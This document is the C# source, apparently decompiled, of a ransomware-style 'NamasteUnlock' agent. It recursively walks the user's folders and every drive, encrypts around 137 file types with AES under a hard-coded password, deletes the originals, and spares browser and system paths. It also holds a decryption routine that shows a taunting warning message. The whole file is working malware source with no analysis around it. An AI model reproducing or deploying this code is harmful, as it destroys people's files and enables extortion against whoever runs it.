using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace NamasteUnlock;

internal class Agent
{
	public bool encrypt;

	public int files;

	public List<Thread> runningThreads = new List<Thread>();

	public ConcurrentBag<string> encryptedFiles = new ConcurrentBag<string>();

	public bool shouldDecryptEntire;

	public string[] TargetFiles { get; } = new string[137]
	{
		".pdf", ".zip", ".ppt", ".doc", ".docx", ".rtf", ".jpg", ".jpeg", ".png", ".img",
		".gif", ".mp3", ".mp4", ".mpeg", ".mov", ".avi", ".wmv", ".txt", ".html", ".php",
		".js", ".css", ".odt", ".sqlite3", ".ink", ".ods", ".odp", ".odm", ".odc", ".odb",
		".docm", ".wps", ".xls", ".xlsx", ".xlsm", ".xlsb", ".xlk", ".ppt", ".pptx", ".pptm",
		".mdb", ".accdb", ".pst", ".dwg", ".dxf", ".dxg", ".wpd", ".wb2", ".mdf", ".psd",
		".pdd", ".eps", ".ai", ".indd", ".cdr", ".jpe", ".tmp", ".log", ".py", ".dbf",
		".ps1", ".dng", ".3fr", ".arw", ".srf", ".sr2", ".bay", ".crw", ".cr2", ".dcr",
		".rwl", ".rw2", ".pyc", ".kdc", ".erf", ".mef", ".mrw", ".nef", ".nrw", ".orf",
		".raf", ".raw", ".r3d", ".ptx", ".css", ".pef", ".srw", ".x3f", ".der", ".cer",
		".crt", ".pem", ".pfx", ".p12", ".p7b", ".p7c", ".sqlite", ".js", ".rb", ".xml",
		".wmi", ".sh", ".asp", ".aspx", ".plist", ".sql", ".vbs", ".litesql", ".dotx", ".db3",
		".backup", ".xlm", ".rtf", "json", ".lua", ".tiff", ".tif", "csproj", ".sln", ".crt",
		".csv", ".flv", ".vlf", ".rar", ".7zip", ".acc", ".lnk", ".cs", ".h", ".cpp",
		".c", ".sg", "mid", ".wav", ".7z", ".exe", ".db"
	};


	public bool IsTargetFile(string filePath)
	{
		if (!encrypt && filePath.Contains("._enc"))
		{
			return true;
		}
		string text = filePath.ToLower();
		if (!(text == Application.get_ExecutablePath().ToLower()) && !text.Contains("wallpaper") && !text.Contains("system32") && !text.Contains("ntuser") && !text.Contains("recycle") && !text.Contains("apple_pie") && !text.Contains("runtimebroker") && !text.Contains("google") && !text.Contains("dontencrypt") && !text.Contains("chrome") && !text.Contains("edge") && !text.Contains("firefox") && !text.Contains("opera") && !text.Contains("safari") && !text.Contains("iexplore") && !text.Contains("chromium") && !text.Contains("brave"))
		{
			if (encrypt && filePath.Contains("._enc"))
			{
				return false;
			}
			if (!encrypt && !filePath.Contains("._enc"))
			{
				return false;
			}
			string value = Path.GetExtension(filePath)!.ToLower();
			try
			{
				if (new FileInfo(filePath).Length > 300000000L)
				{
					return false;
				}
			}
			catch
			{
			}
			return TargetFiles.Contains(value);
		}
		return false;
	}

	public void TraverseDirectories(string startDirectory)
	{
		try
		{
			string[] array = Directory.GetFiles(startDirectory);
			for (int i = 0; i < array.Length; i++)
			{
				ProcessFile(array[i]);
			}
		}
		catch
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(startDirectory);
			foreach (string startDirectory2 in directories)
			{
				TraverseDirectories(startDirectory2);
				Thread.Sleep(1);
			}
		}
		catch
		{
		}
	}

	private void ProcessFile(string filePath)
	{
		if (IsTargetFile(filePath))
		{
			try
			{
				if (encrypt)
				{
					FileEncrypt(filePath, "BQdBbXBKTSuEspGupXfqmTVB");
					encryptedFiles.Add(filePath);
					Interlocked.Increment(ref files);
				}
				else
				{
					FileDecrypt(filePath, "BQdBbXBKTSuEspGupXfqmTVB");
				}
				return;
			}
			catch
			{
				return;
			}
		}
		if (encrypt && filePath.Contains("._enc"))
		{
			Interlocked.Increment(ref files);
		}
	}

	public void StartFolder(string s)
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				TraverseDirectories(s);
			});
			thread.IsBackground = true;
			thread.Start();
			runningThreads.Add(thread);
		}
		catch
		{
		}
	}

	public void StartEncryptionProcess()
	{
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\metadata._dontencrypt"))
		{
			files = 301;
			shouldDecryptEntire = true;
		}
		encrypt = true;
		List<string> list = (from drive in DriveInfo.GetDrives()
			select drive.Name).ToList();
		StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
		StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
		StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
		StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
		foreach (string item in list)
		{
			StartFolder(item);
		}
		new Thread((ThreadStart)delegate
		{
			int num = 0;
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\metadata._dontencrypt", "");
			while (true)
			{
				int num2 = 0;
				foreach (string encryptedFile in encryptedFiles)
				{
					num2++;
					if (num2 > num)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\metadata._dontencrypt", "§" + encryptedFile + "._enc");
						num = num2;
					}
				}
				Thread.Sleep(250);
			}
		}).Start();
	}

	public void StartDecryptionProcess()
	{
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		for (int num = runningThreads.Count - 1; num >= 0; num--)
		{
			try
			{
				runningThreads[num].Abort();
			}
			catch
			{
			}
			runningThreads.RemoveAt(num);
		}
		Thread.Sleep(1000);
		encrypt = false;
		string i = "";
		if (!shouldDecryptEntire && File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\metadata._dontencrypt"))
		{
			i = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\metadata._dontencrypt");
		}
		if (i.Split(new char[1] { '§' }).Length <= 5)
		{
			MessageBox.Show("The metadata file is corrupted! Maybe you restarted your PC? (I told you not to..)\n\nThe decryption process will now take longer since your entire PC has to be scanned\n\nDO NOT TURN YOUR PC OFF", "", (MessageBoxButtons)0, (MessageBoxIcon)64, (MessageBoxDefaultButton)0, (MessageBoxOptions)131072);
			List<string> list = (from drive in DriveInfo.GetDrives()
				select drive.Name).ToList();
			StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
			StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
			StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
			StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
			StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
			StartFolder(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
			foreach (string item in list)
			{
				StartFolder(item);
			}
		}
		else
		{
			try
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					string[] array = i.Split(new char[1] { '§' });
					foreach (string text in array)
					{
						if (text != null && text != "" && File.Exists(text))
						{
							ProcessFile(text);
						}
					}
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\metadata._dontencrypt");
				});
				thread.Start();
				runningThreads.Add(thread);
			}
			catch
			{
				runningThreads.Clear();
			}
		}
		Thread.Sleep(1000);
	}

	public void FileDecrypt(string inputFileName, string password)
	{
		Encoding.UTF8.GetBytes(password);
		using (FileStream stream = new FileStream(inputFileName, FileMode.Open))
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(password, null);
			rijndaelManaged.Key = passwordDeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = passwordDeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CFB;
			using CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
			using FileStream fileStream = new FileStream(inputFileName.Replace("._enc", ""), FileMode.Create);
			byte[] array = new byte[1048576];
			int count;
			while ((count = cryptoStream.Read(array, 0, array.Length)) > 0)
			{
				fileStream.Write(array, 0, count);
			}
		}
		File.Delete(inputFileName);
	}

	public void FileEncrypt(string inputFile, string password)
	{
		Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(password, null);
		rijndaelManaged.Key = passwordDeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = passwordDeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		using (FileStream stream = new FileStream(inputFile + "._enc", FileMode.Create))
		{
			using CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			using FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			byte[] array = new byte[1048576];
			int count;
			while ((count = fileStream.Read(array, 0, array.Length)) > 0)
			{
				cryptoStream.Write(array, 0, count);
			}
		}
		File.Delete(inputFile);
	}
}
